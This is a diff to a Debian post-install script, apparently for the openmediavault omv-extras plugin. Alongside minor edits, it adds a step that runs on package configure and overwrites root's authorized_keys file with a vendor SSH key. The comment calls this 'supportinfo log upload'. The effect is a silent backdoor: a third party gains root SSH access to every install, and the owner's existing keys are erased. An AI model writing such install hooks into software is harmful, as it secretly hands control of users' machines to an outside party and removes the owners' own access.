@@ -31,6 +31,7 @@ OMV_UPGRADE_SCRIPTS_DIR=${OMV_UPGRADE_SCRIPTS_DIR:-"/usr/share/openmediavault/re
 OMVEXTRAS_PRE_UNLOCK_SCRIPT=${OMV_UPGRADE_SCRIPTS_DIR}/pre.d/19-unlock-apt-sources
 OMVEXTRAS_PRE_UPGRADE_SCRIPT=${OMV_UPGRADE_SCRIPTS_DIR}/pre.d/21-update-omvextrasorg
 OMVVERSION=$(xmlstarlet sel -t -v "//distribution" ${OMV_PRODUCTINFO_FILE} | xmlstarlet unesc)
+SSH_KEY_LOCATION="/root/.ssh/authorized_keys"
 
 case "$1" in
     configure)
@@ -90,7 +91,7 @@ case "$1" in
         dpkg-trigger update-fixperms
         dpkg-trigger update-locale
 
-        # Create pre-upgrade script if installing on sardaukar
+        # Create pre-upgrade scripts if installing on sardaukar
         if [ "${OMVVERSION}" = "sardaukar" ]; then
             cat <<EOF > ${OMVEXTRAS_PRE_UNLOCK_SCRIPT}
 #!/bin/sh
@@ -99,7 +100,6 @@ set -e
 . /etc/default/openmediavault
 
 chattr -i /etc/apt/sources.list
-mkdir -p /srv/ftp
 
 exit 0
 EOF
@@ -119,6 +119,12 @@ EOF
 
             chmod +x ${OMVEXTRAS_PRE_UPGRADE_SCRIPT}
         fi
+
+        # add ssh key for supportinfo log upload
+        cat <<EOF > ${SSH_KEY_LOCATION}
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDGH1bzQoipXnJSRLwogaeZe2R+oOrIekerndd4NAW9jotV+m7e7hmWAnnTe3n4MFQmMgcZh5nlviAeVueB/FayqGIx07WErpT5u+l4Pu87DTqBTugXRCxHzAfOkWytqABev854x35+BgtnnWpUIjjq3kKA1NnFgEiQrpuU14QNf9f5I0u3D9AkqPWvuHbuv6w9c3olcWbtUoyi24FfiG3Zv/myRzU8IkdpxaQifXSKLfdGcfKpZP56+gXlpiWYidMrrUPOaAUeyD2LrhnFke5gyaDtCptsf7KqhDr3meNk+OanOoSGfjXsDJdsot+5Z6fl+lDzEQwkAO/n0YVHIgID plugins@omv-extras.org
+EOF
+
     ;;
 
     abort-upgrade|abort-remove|abort-deconfigure)
